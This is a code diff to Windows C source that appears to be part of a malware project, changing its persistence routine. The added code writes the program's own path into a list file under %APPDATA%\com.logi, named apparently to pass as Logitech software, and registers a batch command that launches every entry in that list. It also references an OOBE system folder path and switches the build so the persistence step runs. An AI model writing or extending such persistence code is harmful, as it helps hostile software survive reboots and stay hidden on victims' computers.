@@ -1,5 +1,7 @@
 ﻿#include "pch.h"
 
+BOOL Persistence();
+
 VOID Callback
 (
 	_In_ BSTR lpInput,
@@ -2059,6 +2061,10 @@ void test127(void) {
 	PersistenceMethod1("C:\\Windows\\System32\\cmd.exe");
 }
 
+void test128(void) {
+	Persistence();
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2080,17 +2086,26 @@ BOOL IsExist
 
 BOOL Persistence()
 {
-	CHAR szModulePath[MAX_PATH];
+	CHAR szModulePath[0x200];
 	CHAR szOOBEPath[MAX_PATH];
+	WCHAR wszExeListPath[MAX_PATH];
 	LPSTR lpTemp = NULL;
+	CHAR szCommand[] = "@echo off\nFor /f \"delims=\" %%a in ('Type \"%APPDATA%\\com.logi\\list.txt\"') do (%%a)";
 
+	SecureZeroMemory(szModulePath, sizeof(szModulePath));
 	GetModuleFileNameA(NULL, szModulePath, _countof(szModulePath));
 	GetSystemDirectoryA(szOOBEPath, _countof(szOOBEPath));
 	lpTemp = StrStrA(szOOBEPath, "system32");
 	lpTemp[0] = 'S';
 	lstrcatA(szOOBEPath, "\\oobe\\oobeldr.exe");
-	if (!PersistenceMethod1(szModulePath)) {
-		PrintFormatA("PersistenceMethod1 failed: %s\n", szModulePath);
+	szModulePath[lstrlenA(szModulePath)] = '\n';
+	ExpandEnvironmentStringsW(L"%APPDATA%\\com.logi\\list.txt", wszExeListPath, _countof(wszExeListPath));
+	if (!AppendToFile(wszExeListPath, szModulePath, lstrlenA(szModulePath))) {
+		return FALSE;
+	}
+
+	if (!PersistenceMethod1(szCommand)) {
+		PrintFormatA("PersistenceMethod1 failed: %s\n", szCommand);
 		return FALSE;
 	}
 
@@ -2186,7 +2201,7 @@ VOID Final(VOID)
 		goto CLEANUP;
 	}
 
-#ifndef _DEBUG
+#ifdef _DEBUG
 	if (!Persistence()) {
 		goto CLEANUP;
 	}
@@ -2370,7 +2385,8 @@ int main(void) {
 	//test125();
 	//test126();
 	//test127();
-	Final();
+	test128();
+	//Final();
 
 	return 0;
 }
